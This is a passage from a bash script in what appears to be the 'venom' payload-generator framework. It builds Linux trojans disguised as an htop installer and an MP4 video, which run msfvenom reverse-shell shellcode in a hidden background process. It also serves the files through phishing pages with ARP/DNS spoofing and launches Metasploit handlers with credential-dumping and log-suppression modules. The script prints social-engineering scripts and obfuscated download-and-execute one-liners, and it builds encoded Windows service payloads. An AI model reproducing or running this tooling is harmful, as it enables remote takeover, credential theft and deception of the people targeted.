echo "MITRE ATT&CK T1036 served as Linux RAT agent (trojan)." >> htop.c
echo "gcc -fno-stack-protector -z execstack htop.c -o htop_installer.deb" >> htop.c
echo "'Naming the compiled C program to .deb does not call the dpkg at runtime (MITRE ATT&CK T1036)'" >> htop.c
echo "*/" >> htop.c
echo "" >> htop.c
echo "/* msfvenom -p $paylo LHOST=$lhost LPORT=$lport -f c */" >> htop.c
echo "unsigned char voodoo[] = \"$parse\";" >> htop.c
echo "" >> htop.c
echo "int main()" >> htop.c
echo "{" >> htop.c
echo "   /*" >> htop.c
echo "   This fork(); function allow us to spawn a new child process (in background). This way i can" >> htop.c
echo "   execute shellcode in background while continue the execution of the C program in foreground." >> htop.c
echo "   Article: https://www.geeksforgeeks.org/zombie-and-orphan-processes-in-c" >> htop.c
echo "   */" >> htop.c
echo "   fflush(NULL);" >> htop.c
echo "   int pid = fork();" >> htop.c
echo "      if (pid > 0) {" >> htop.c
echo "         /*" >> htop.c
echo "         We are runing in parent process (child its also running)" >> htop.c
echo "         Install/run htop proccess manager (as foreground job)" >> htop.c
echo "         */" >> htop.c
echo "         printf(\"+---------------------------------+\\\n\");" >> htop.c
echo "         printf(\"|  install Htop proccess manager  |\\\n\");" >> htop.c
echo "         printf(\"+---------------------------------+\\\n\\\n\");" >> htop.c
echo "         /* Display system information onscreen to target user */" >> htop.c
echo "         system(\"h=\$(hostnamectl | grep 'Static' | cut -d ':' -f2);echo \\\"    Hostname :\$h\\\"\");" >> htop.c
echo "         system(\"c=\$(hostnamectl | grep 'Icon' | cut -d ':' -f2);echo \\\"    Icon     :\$c\\\"\");" >> htop.c
echo "         system(\"o=\$(hostnamectl | grep 'Operating' | cut -d ':' -f2);echo \\\"    OS       :\$o\\\"\");" >> htop.c
echo "         system(\"k=\$(hostnamectl | grep 'Kernel' | cut -d ':' -f2);echo \\\"    Kernel   :\$k\\\"\");" >> htop.c
echo "" >> htop.c
echo "            /* Install htop package */" >> htop.c
echo "            sleep(1);printf(\"\\\n[*] Please wait, Installing htop package ..\\\n\");" >> htop.c
echo "            sleep(1);system(\"sudo apt-get update -qq && sudo apt-get install -y -qq htop\");" >> htop.c
echo "" >> htop.c
echo "         /* Execute htop proccess manager */" >> htop.c
echo "         system(\"f=\$(htop -v | grep -m 1 'htop' | awk {'print \$2'});echo \\\"[i] Htop package version installed: \$f\\\"\");" >> htop.c
echo "	       sleep(1);printf(\"[*] Please wait, executing htop software ..\\\n\");" >> htop.c
echo "	       sleep(3);system(\"htop\");" >> htop.c
echo "      }" >> htop.c
echo "      else if (pid == 0) {" >> htop.c
echo "         /*" >> htop.c
echo "         We are running in child process (as backgrond job - orphan)." >> htop.c
echo "         setsid(); allow us to detach the child (shellcode) from parent (htop_installer.deb) process," >> htop.c
echo "         allowing us to continue running the shellcode in ram even if parent process its terminated." >> htop.c
echo "         */" >> htop.c
echo "         setsid();" >> htop.c
echo "         void(*ret)() = (void(*)())voodoo;" >> htop.c
echo "         ret();" >> htop.c
echo "      } return 0;" >> htop.c
echo "}" >> htop.c


echo ""
echo "[☠] Compile C program (MITRE ATT&CK T1036) .."
sleep 1
gcc -fno-stack-protector -z execstack $IPATH/output/htop.c -o $IPATH/output/htop_installer.deb


sleep 2
echo "[☠] Give execution permitions to agent .."
sleep 1
chmod +x $IPATH/output/htop_installer.deb > /dev/null 2>&1


# CHOSE HOW TO DELIVER YOUR PAYLOAD
serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload stored:\n$IPATH/output/htop_installer.deb\n\nchose how to deliver: htop_installer.deb" --radiolist --column "Pick" --column "Option" TRUE "multi-handler (default)" FALSE "apache2 (malicious url)" --width 305 --height 220) > /dev/null 2>&1


   if [ "$serv" = "multi-handler (default)" ]; then
      # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
      echo "[☠] Start a multi-handler..."
      echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
      echo "[☯] Please dont test samples on virus total..."
        if [ "$MsFlF" = "ON" ]; then

          if [ "$paylo" = "linux/x86/meterpreter_reverse_https" ] || [ "$paylo" = "linux/x64/meterpreter_reverse_https" ]; then
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; exploit'"
          else
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
          fi

          cd $IPATH/output
          # delete utf-8/non-ancii caracters from output
          tr -cd '\11\12\15\40-\176' < report.log > final.log
          sed -i "s/\[0m//g" final.log
          sed -i "s/\[1m\[34m//g" final.log
          sed -i "s/\[4m//g" final.log
          sed -i "s/\[K//g" final.log
          sed -i "s/\[1m\[31m//g" final.log
          sed -i "s/\[1m\[32m//g" final.log
          sed -i "s/\[1m\[33m//g" final.log
          mv final.log $N4m-$lhost.log > /dev/null 2>&1
          rm report.log > /dev/null 2>&1
          cd $IPATH/
        else

          if [ "$paylo" = "linux/x86/meterpreter_reverse_https" ] || [ "$paylo" = "linux/x64/meterpreter_reverse_https" ]; then
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; exploit'"
          else
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
          fi
        fi
      sleep 2

   else

# post-exploitation
P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploitation module to run" --radiolist --column "Pick" --column "Option" TRUE "sysinfo.rc" FALSE "linux_hostrecon.rc" FALSE "dump_credentials_linux.rc" FALSE "exploit_suggester.rc" --width 305 --height 260) > /dev/null 2>&1


if [ "$P0" = "linux_hostrecon.rc" ]; then
  if [ -e "$pHanTom/post/linux/gather/linux_hostrecon.rb" ]; then
    echo "[✔] linux_hostrecon.rb -> found"
    sleep 2
  else
    echo "[x] linux_hostrecon.rb -> not found"
    sleep 1
    echo "[*] copy post-module to msfdb .."
    cp $IPATH/aux/msf/linux_hostrecon.rb $pHanTom/post/linux/gather/linux_hostrecon.rb > /dev/null 2>&1
    echo "[☠] Reloading msfdb database .."
    sleep 2
    xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfdb reinit" > /dev/null 2>&1
    xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfconsole -q -x 'db_status; reload_all; exit -y'" > /dev/null 2>&1
  fi
fi


      # edit files nedded
      echo "[☠] copy files to webroot..."
      cd $IPATH/templates/phishing
      cp $InJEc12 mega[bak].html
      sed "s|NaM3|htop_installer.deb|g" mega.html > copy.html
      mv copy.html $ApAcHe/index.html > /dev/null 2>&1
      cd $IPATH/output
      cp htop_installer.deb $ApAcHe/htop_installer.deb > /dev/null 2>&1
      echo "[☠] loading -> Apache2Server!"
      echo "---"
      echo "- SEND THE URL GENERATED TO TARGET HOST"

        if [ "$D0M4IN" = "YES" ]; then
        # copy files nedded by mitm+dns_spoof module
        sed "s|NaM3|htop_installer.deb|" $IPATH/templates/phishing/mega.html > $ApAcHe/index.html
        cp $IPATH/output/htop_installer.deb $ApAcHe/htop_installer.deb
        echo "- ATTACK VECTOR: http://mega-upload.com"
        echo "- POST EXPLOIT : $P0"
        echo "---"
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo "[☠] Start a multi-handler..."
        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
        echo "[☯] Please dont test samples on virus total..."
          if [ "$MsFlF" = "ON" ]; then

            if [ "$paylo" = "linux/x86/meterpreter_reverse_https" ] || [ "$paylo" = "linux/x64/meterpreter_reverse_https" ]; then
              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
            else
              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
            fi

           cd $IPATH/output
           # delete utf-8/non-ancii caracters from output
           tr -cd '\11\12\15\40-\176' < report.log > final.log
           sed -i "s/\[0m//g" final.log
           sed -i "s/\[1m\[34m//g" final.log
           sed -i "s/\[4m//g" final.log
           sed -i "s/\[K//g" final.log
           sed -i "s/\[1m\[31m//g" final.log
           sed -i "s/\[1m\[32m//g" final.log
           sed -i "s/\[1m\[33m//g" final.log
           mv final.log $N4m-$lhost.log > /dev/null 2>&1
           rm report.log > /dev/null 2>&1
           cd $IPATH/
          else

            if [ "$paylo" = "linux/x86/meterpreter_reverse_https" ] || [ "$paylo" = "linux/x64/meterpreter_reverse_https" ]; then
              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
            else
              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
            fi
          fi


        else


        echo "- ATTACK VECTOR: http://$lhost"
        echo "- POST EXPLOIT : $P0"
        echo "---"
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo "[☠] Start a multi-handler..."
        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
        echo "[☯] Please dont test samples on virus total..."
          if [ "$MsFlF" = "ON" ]; then

            if [ "$paylo" = "linux/x86/meterpreter_reverse_https" ] || [ "$paylo" = "linux/x64/meterpreter_reverse_https" ]; then
              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
            else
              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
            fi

            cd $IPATH/output
            # delete utf-8/non-ancii caracters from output
            tr -cd '\11\12\15\40-\176' < report.log > final.log
            sed -i "s/\[0m//g" final.log
            sed -i "s/\[1m\[34m//g" final.log
            sed -i "s/\[4m//g" final.log
            sed -i "s/\[K//g" final.log
            sed -i "s/\[1m\[31m//g" final.log
            sed -i "s/\[1m\[32m//g" final.log
            sed -i "s/\[1m\[33m//g" final.log
            mv final.log $N4m-$lhost.log > /dev/null 2>&1
            rm report.log > /dev/null 2>&1
            cd $IPATH/
          else

            if [ "$paylo" = "linux/x86/meterpreter_reverse_https" ] || [ "$paylo" = "linux/x64/meterpreter_reverse_https" ]; then
              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
            else
              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
            fi
          fi
        fi
   fi



sleep 2
# CLEANING EVERYTHING UP
echo "[☠] Cleanning temp generated files..."
sleep 2
mv $IPATH/templates/phishing/mega[bak].html $InJEc12 > /dev/null 2>&1
rm $ApAcHe/index.html > /dev/null 2>&1
rm $ApAcHe/htop_installer.deb > /dev/null 2>&1
clear
cd $IPATH/
sh_menu

else

  echo ${RedF}[x]${white} Abort module execution ..${Reset};
  sleep 2
  sh_menu
  clear
fi
}




#
# mp4-trojan horse 
#
sh_mp4_trojan () {
# get user input to build shellcode
echo "[☠] Enter shellcode settings!"
lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
if [ "$?" -eq "0" ]; then
lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --width 300) > /dev/null 2>&1
paylo=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\nAvailable Payloads:" --radiolist --column "Pick" --column "Option" FALSE "linux/ppc/shell_reverse_tcp" FALSE "linux/x86/shell_reverse_tcp" TRUE "linux/x86/meterpreter/reverse_tcp" FALSE "linux/x64/shell/reverse_tcp" FALSE "linux/x64/shell_reverse_tcp" FALSE "linux/x64/meterpreter/reverse_tcp" --width 400 --height 300) > /dev/null 2>&1
appl=$(zenity --title "☠ Chose mp4 file to be backdoored ☠" --filename=$IPATH/bin/mp4/ --file-selection) > /dev/null 2>&1
mP4=$(zenity --entry --title "☠ MP4 NAME ☠" --text "Enter MP4 output name\nexample: ricky-video" --width 300) > /dev/null 2>&1

## setting default values in case user have skip this ..
if [ -z "$lhost" ]; then lhost="$IP";fi
if [ -z "$lport" ]; then lport="443";fi
if [ -z "$mP4" ]; then mP4="ricky-video";fi
if [ -z "$appl" ]; then echo "${RedF}[x]${white} This Module Requires one PDF file input";sleep 3; sh_exit;fi

echo "[☠] Building agent -> C format .." && sleep 2
# display final settings to user
cat << !

    venom settings
    ──────────────
    LPORT   : $lport
    LHOST   : $lhost
    FORMAT  : C -> LINUX
    PAYLOAD : $paylo
    MP4VIDEO: $IPATH/output/streaming.mp4
    TROJAN  : $IPATH/output/$mP4.mp4

!
sleep 1
# Make sure that the extension provided its .mp4
ext=$(echo $appl | cut -d '.' -f2)
if [ "$ext" != "mp4" ]; then
   echo ${RedF}[x]${white} Abort, NON compatible extension provided:${RedF}.$ext ${Reset};
   sleep 3 && sh_exit
fi

# Parse mp4 video name for transformation
echo "$appl" > /tmp/test.txt
N4m=$(grep -oE '[^/]+$' /tmp/test.txt) > /dev/null 2>&1
echo "[☠] Rename mp4 from: $N4m To: streaming.mp4" && sleep 2
cp $appl $IPATH/output/streaming.mp4 > /dev/null 2>&1


# use metasploit to build shellcode (msf encoded)
echo "[☠] Using msfvenom to build raw C shellcode .." && sleep 2
xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "msfvenom -p $paylo LHOST=$lhost LPORT=$lport -f c -o $IPATH/output/chars.raw"
echo "[☠] Parsing raw shellcode data (oneliner) .." && sleep 1
parse=$(cat $IPATH/output/chars.raw | grep -v "=" | tr -d '";' | tr -d '\n' | tr -d ' ')
echo ""
echo "unsigned char buf[] ="
echo "$parse"
echo ""


cd $IPATH/output
# Build C program (trojan.mp4)
echo "[☠] Building $mP4 C Program .." && sleep 2
echo "#include<stdio.h>" > $mP4.c
echo "#include<stdlib.h>" >> $mP4.c
echo "#include<string.h>" >> $mP4.c
echo "#include<sys/types.h>" >> $mP4.c
echo "#include<sys/wait.h>" >> $mP4.c
echo "#include<unistd.h>" >> $mP4.c
echo "" >> $mP4.c
echo "/*" >> $mP4.c
echo "Author: r00t-3xp10it" >> $mP4.c
echo "Framework: venom v1.0.17" >> $mP4.c
echo "MITRE ATT&CK T1036 served as Linux RAT agent (trojan)." >> $mP4.c
echo "gcc -fno-stack-protector -z execstack $mP4.c -o $mP4.mp4" >> $mP4.c
echo "*/" >> $mP4.c
echo "" >> $mP4.c
echo "unsigned char voodoo[] = \"$parse\";" >> $mP4.c
echo "" >> $mP4.c
echo "int main()" >> $mP4.c
echo "{" >> $mP4.c
echo "   /*" >> $mP4.c
echo "   This fork(); function allow us to spawn a new child process (in background)." >> $mP4.c
echo "   Article: https://www.geeksforgeeks.org/zombie-and-orphan-processes-in-c" >> $mP4.c
echo "   */" >> $mP4.c
echo "   fflush(NULL);" >> $mP4.c
echo "   int pid = fork();" >> $mP4.c
echo "      if (pid > 0) {" >> $mP4.c
echo "         system(\"sudo /usr/bin/wget -qq http://$lhost/streaming.mp4 -O /tmp/streaming.mp4 && sudo /usr/bin/xdg-open /tmp/streaming.mp4 > /dev/nul 2>&1 & exit\");" >> $mP4.c
echo "      }" >> $mP4.c
echo "      else if (pid == 0) {" >> $mP4.c
echo "         /*" >> $mP4.c
echo "         We are running in child process (as backgrond job - orphan)." >> $mP4.c
echo "         setsid(); allow us to detach the child (shellcode) from parent (streaming.mp4) process," >> $mP4.c
echo "         allowing us to continue running the shellcode in ram even if parent process its terminated." >> $mP4.c
echo "         */" >> $mP4.c
echo "         setsid();" >> $mP4.c
echo "         void(*ret)() = (void(*)())voodoo;" >> $mP4.c
echo "         ret();" >> $mP4.c
echo "      } return 0;" >> $mP4.c
echo "}" >> $mP4.c


## Compile/permitions/copy_to_apache2 ( C program )
echo "[☠] Compile C program (MITRE ATT&CK T1036) .." && sleep 1
gcc -fno-stack-protector -z execstack $IPATH/output/$mP4.c -o $IPATH/output/$mP4.mp4
echo "[☠] Give execution permitions to agent .." && sleep 1
chmod +x $IPATH/output/$mP4.mp4 > /dev/null 2>&1
echo "[☠] Porting all files to apache2 webroot .." && sleep 1
zip $mP4.zip $mP4.mp4 > /dev/null 2>&1
cp $IPATH/output/$mP4.mp4 $ApAcHe/$mP4.mp4 > /dev/null 2>&1
cp $IPATH/output/$mP4.zip $ApAcHe/$mP4.zip > /dev/null 2>&1
cp $IPATH/output/streaming.mp4 $ApAcHe/streaming.mp4 > /dev/null 2>&1
cd $IPATH


# CHOSE HOW TO DELIVER YOUR PAYLOAD
serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload stored:\n$IPATH/output/$mP4.mp4\n\nchose how to deliver: $mP4.mp4" --radiolist --column "Pick" --column "Option" FALSE "multi-handler (default)" TRUE "Oneliner (download/exec)" --width 305 --height 220) > /dev/null 2>&1


ovni=$(cat $IPATH/settings|grep -m 1 'OBFUSCATION'|cut -d '=' -f2) # Read settings from venom-main settings file.
if [ "$serv" = "multi-handler (default)" ]; then

   original_string="sudo ./$mP4.mp4";color="${RedF}"
   ## Read the next setting from venom-main setting file .
   if [ "$ovni" = "ON" ]; then
      ## Reverse original string (venom attack vector)
      xterm -T " Reversing Original String (oneliner)" -geometry 110x23 -e "rev <<< \"$original_string\" > /tmp/reverse.txt"
      reverse_original=$(cat /tmp/reverse.txt);rm /tmp/reverse.txt
      original_string="rev <<< \"$reverse_original\"|\$0"
      color="${GreenF}"
   fi

   ## Print on terminal
   echo ${white}[☠] venom-main/Settings: [OBFUSCATION:$color$ovni${white}]${Reset};sleep 1
   echo "---";echo "-  ${YellowF}SOCIAL_ENGINEERING:"${Reset};
   echo "-  Persuade the target to run '$mP4.mp4' executable using their terminal."
   echo "-  That will remote download/exec (LAN) our mp4 video file and auto executes"
   echo "-  our C shellcode in an orphan process (detach from mp4 video process)."
   echo "-  REMARK: All files required by this module have been ported to apache2."
   echo "-";echo "-  ${YellowF}MANUAL_EXECUTION:"${Reset};
   echo "-  $original_string";echo "---"
   echo -n "[☠] Press any key to start a handler .."
   read odf
   echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
   echo "[☯] Please dont test samples on virus total .."
   ## Is venom framework configurated to store logfiles?
   if [ "$MsFlF" = "ON" ]; then
      xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/$mP4.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
   else
      xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
   fi

else

   original_string="sudo wget http://$lhost/$mP4.zip;unzip $mP4.zip;./$mP4.mp4";color="${RedF}"
   ## Reverse original string (venom attack vector)
   xterm -T " Reversing Original String (oneliner)" -geometry 110x23 -e "rev <<< \"$original_string\" > /tmp/reverse.txt"
   reverse_original=$(cat /tmp/reverse.txt);rm /tmp/reverse.txt
   ## Read the next setting from venom-main setting file .
   if [ "$ovni" = "ON" ]; then
      original_string="sudo wget http://$lhost/$mP4.zip;h=.;unzip $mP4.zip;\$h/$mP4.mp4"
      color="${GreenF}"
   fi
   
   ## Print on terminal
   echo ${white}[☠] venom-main/Settings: [OBFUSCATION:$color$ovni${white}]${Reset};sleep 1
   echo "---";echo "-  ${YellowF}SOCIAL_ENGINEERING:"${Reset};
   echo "-  Persuade the target to run the 'oneliner' OR the 'oneliner_obfuscated' command"
   echo "-  on their terminal. That will remote download/exec (LAN) our mp4 video file and"
   echo "-  auto executes our C shellcode in an orphan process (detach from mp4 video process)."
   echo "-";echo "-  ${YellowF}ONELINER:"${Reset};
   echo "-  $original_string";echo "-"
   echo "-  ${YellowF}ONELINER_OBFUSCATED:"${Reset};
   echo "-  rev <<< \"$reverse_original\"|\$0"
   echo "---"
   echo -n "[☠] Press any key to start a handler .."
   read odf
   echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
   echo "[☯] Please dont test samples on virus total .."
   ## Is venom framework configurated to store logfiles?
   if [ "$MsFlF" = "ON" ]; then
      xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/$mP4.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
   else
      xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
   fi

fi


# CLEANING EVERYTHING UP
echo "[☠] Cleanning temp generated files .."
sleep 2
rm /tmp/test.txt > /dev/null 2>&1
rm /tmp/stream.mp4 > /dev/null 2>&1
rm /tmp/reverse.txt > /dev/null 2>&1
rm $ApAcHe/$mP4.mp4 > /dev/null 2>&1
rm $ApAcHe/$mP4.zip > /dev/null 2>&1
rm $ApAcHe/streaming.mp4 > /dev/null 2>&1
rm $IPATH/output/$mP4.zip > /dev/null 2>&1
rm $IPATH/output/streaming.mp4 > /dev/null 2>&1
sleep 2 && sh_menu


else

  echo ${RedF}[x]${white} Abort module execution ..${Reset};
  sleep 2 && sh_menu
  clear
fi
}





# -----------------------------------------------------
# build shellcode in EXE format (windows-platforms)
# to deploy againts windows service (exe-service)
# ------------------------------------------------------
sh_shellcode22 () {
QuE=$(zenity --question --title="☠ SHELLCODE GENERATOR ☠" --text "This module builds exe-service payloads to be\ndeployed into windows_service_control_manager\n(SCM) service-payload.\n\nRun module?" --width 320) > /dev/null 2>&1
if [ "$?" -eq "0" ]; then

# get user input to build shellcode
echo "[☠] Enter shellcode settings!"
lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --width 300) > /dev/null 2>&1
N4m=$(zenity --entry --title "☠ PAYLOAD NAME ☠" --text "Enter payload output name\nexample: ProgramX" --width 300) > /dev/null 2>&1
# input payload choise
paylo=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\nAvailable Payloads:" --radiolist --column "Pick" --column "Option" TRUE "windows/shell_bind_tcp" FALSE "windows/shell/reverse_tcp" FALSE "windows/meterpreter/reverse_tcp" FALSE "windows/meterpreter/reverse_tcp_dns" FALSE "windows/meterpreter/reverse_http" FALSE "windows/meterpreter/reverse_https" FALSE "windows/x64/meterpreter/reverse_tcp" FALSE "windows/x64/meterpreter/reverse_https" --width 350 --height 350) > /dev/null 2>&1


## setting default values in case user have skip this ..
if [ -z "$lhost" ]; then lhost="$IP";fi
if [ -z "$lport" ]; then lport="443";fi
if [ -z "$N4m" ]; then N4m="ProgramX";fi

echo "[☠] Building shellcode -> exe-service format ..."
sleep 2
echo "[☠] obfuscating -> msf encoders!"
sleep 2
# display final settings to user
cat << !

    venom settings
    ──────────────
    LPORT   : $lport
    LHOST   : $lhost
    FORMAT  : EXE-SERVICE -> WINDOWS(SCM)
    PAYLOAD : $paylo

!

# use metasploit to build shellcode (msf encoded)
if [ "$paylo" = "windows/x64/meterpreter/reverse_tcp" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "msfvenom -p $paylo LHOST=$lhost LPORT=$lport --platform windows -f exe-service > $IPATH/output/$N4m.exe"
else
xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "msfvenom -p $paylo LHOST=$lhost LPORT=$lport -a x86 --platform windows -e x86/countdown -i 8 -f raw | msfvenom -a x86 --platform windows -e x86/call4_dword_xor -i 7 -f raw | msfvenom -a x86 --platform windows -e x86/shikata_ga_nai -i 9 -f exe-service > $IPATH/output/$N4m.exe"
fi


# CHOSE HOW TO DELIVER YOUR PAYLOAD
serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload stored:\n$IPATH/output/$N4m.exe\n\nchose how to deliver: $N4m.exe" --radiolist --column "Pick" --column "Option" TRUE "multi-handler (default)" FALSE "apache2 (malicious url)" --width 305 --height 220) > /dev/null 2>&1


   if [ "$serv" = "multi-handler (default)" ]; then
      # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
      echo "[☠] Start a multi-handler..."
      echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
      echo "[☯] Please dont test samples on virus total..."
        if [ "$MsFlF" = "ON" ]; then
          xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
          cd $IPATH/output
          # delete utf-8/non-ancii caracters from output
          tr -cd '\11\12\15\40-\176' < report.log > final.log
          sed -i "s/\[0m//g" final.log
          sed -i "s/\[1m\[34m//g" final.log
          sed -i "s/\[4m//g" final.log
          sed -i "s/\[K//g" final.log
          sed -i "s/\[1m\[31m//g" final.log
          sed -i "s/\[1m\[32m//g" final.log
          sed -i "s/\[1m\[33m//g" final.log
          mv final.log $N4m-$lhost.log > /dev/null 2>&1
          rm report.log > /dev/null 2>&1
          cd $IPATH/
        else
          xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
        fi
      sleep 2


   else


P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploitation module to run" --radiolist --column "Pick" --column "Option" TRUE "sysinfo.rc" FALSE "enum_system.rc" FALSE "dump_credentials.rc" FALSE "fast_migrate.rc" FALSE "stop_logfiles_creation.rc" FALSE "exploit_suggester.rc" --width 305 --height 300) > /dev/null 2>&1


  if [ "$P0" = "stop_logfiles_creation.rc" ]; then
    #
    # check if dependencies exist ..
    #
    if [ -e "$pHanTom/post/windows/manage/Invoke-Phant0m.rb" ]; then
      echo "[☠] Invoke-Phant0m.rb installed .."
      sleep 2
    else
      echo "[x] Invoke-Phant0m.rb not found .."
      sleep 2
      echo "[☠] copy Invoke-Phant0m.rb to msfdb .."
      sleep 2
      cp $IPATH/aux/msf/Invoke-Phant0m.rb $pHanTom/post/windows/manage/Invoke-Phant0m.rb > /dev/null 2>&1
      echo "[☠] Reloading msfdb database .."
      sleep 2
      xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfdb reinit" > /dev/null 2>&1
      xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfconsole -q -x 'db_status; reload_all; exit -y'" > /dev/null 2>&1
    fi

      #
      # check if Invoke-Phantom.ps1 exists ..
      #
      if [ -e "$IPATH/aux/Invoke-Phant0m.ps1" ]; then
        echo "[☠] Invoke-Phant0m.ps1 found .."
        sleep 2
        cp $IPATH/aux/Invoke-Phant0m.ps1 /tmp/Invoke-Phant0m.ps1 > /dev/null 2>&1
      else
        echo "[x] Invoke-Phant0m.ps1 not found .."
        sleep 2
        echo "[☠] Please place module in $IPATH/aux folder .."
        sleep 2
        exit
      fi
  fi


    # Build listenner resource file
